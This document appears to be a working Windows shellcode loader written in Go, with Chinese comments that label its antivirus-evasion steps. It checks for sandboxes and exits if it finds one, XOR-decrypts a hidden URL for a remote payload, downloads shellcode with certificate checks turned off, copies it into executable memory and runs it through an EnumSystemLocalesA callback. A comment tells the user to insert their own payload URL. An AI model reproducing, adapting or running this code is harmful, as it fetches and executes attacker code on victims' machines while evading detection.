package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32             = syscall.NewLazyDLL("kernel32.dll")
	//user32               = syscall.NewLazyDLL("user32.dll") // 某些API在这里
	ntdll                = syscall.NewLazyDLL("ntdll.dll")
	virtualAlloc         = kernel32.NewProc("VirtualAlloc")
	enumSystemLocalesA   = kernel32.NewProc("EnumSystemLocalesA") // 用于回调执行
	RtlMoveMemory        = ntdll.NewProc("RtlMoveMemory")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

// [免杀1] XOR 解密函数
func xorDecrypt(data []byte, key byte) string {
	decrypted := make([]byte, len(data))
	for i, b := range data {
		decrypted[i] = b ^ key
	}
	return string(decrypted)
}

// [免杀2] 高级反沙箱: 时间扭曲检测
func checkTimeDistortion() bool {
	start := time.Now()
	// 休眠 3 秒
	time.Sleep(3 * time.Second)
	end := time.Now()
	
	// 如果实际流逝时间小于 2.5 秒，说明系统时间被加速了（沙箱特征）
	if end.Sub(start) < 2500*time.Millisecond {
		return true // 是沙箱
	}
	return false
}

// [免杀3] 资源检测
func checkResources() bool {
	if runtime.NumCPU() < 2 { return true }
	return false
}

func main() {
	// 1. 环境检测
	if checkResources() || checkTimeDistortion() {
		return // 悄悄退出
	}

	// 2. 解密 URL (请替换为你刚才生成的!)
	// 示例: "https://api.cailiu666.xyz/payload.bin" XOR 0x88
	encryptedURL := []byte{0xe0, 0xfc, 0xfc, 0xf8, 0xfb, 0xb2, 0xa7, 0xa7, 0xe9, 0xf8, 0xe1, 0xa6, 0xeb, 0xe9, 0xe1, 0xe4, 0xe1, 0xfd, 0xbe, 0xbe, 0xbe, 0xa6, 0xf0, 0xf1, 0xf2, 0xa7, 0xf8, 0xe9, 0xf1, 0xe4, 0xe7, 0xe9, 0xec, 0xa6, 0xea, 0xe1, 0xe6, }
	url := xorDecrypt(encryptedURL, 0x88)

	// 3. 下载 Shellcode
	shellcode, err := download(url)
	if err != nil || len(shellcode) == 0 { return }

	// 4. 申请内存
	addr, _, _ := virtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 { return }

	// 5. 写入 Shellcode (RtlMoveMemory)
	_, _, _ = RtlMoveMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	// 6. [免杀5] 回调函数执行 (Callback Execution)
	// 不使用 CreateThread，而是利用系统枚举函数的“回调”机制来执行我们的 Shellcode
	// EnumSystemLocalesA 会调用第一个参数指向的地址
	enumSystemLocalesA.Call(addr, 0)
}

func download(url string) ([]byte, error) {
	tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true} }
	client := &http.Client{Transport: tr}
	resp, err := client.Get(url)
	if err != nil { return nil, err }
	defer resp.Body.Close()
	if resp.StatusCode != 200 { return nil, fmt.Errorf("error") }
	return io.ReadAll(resp.Body)
}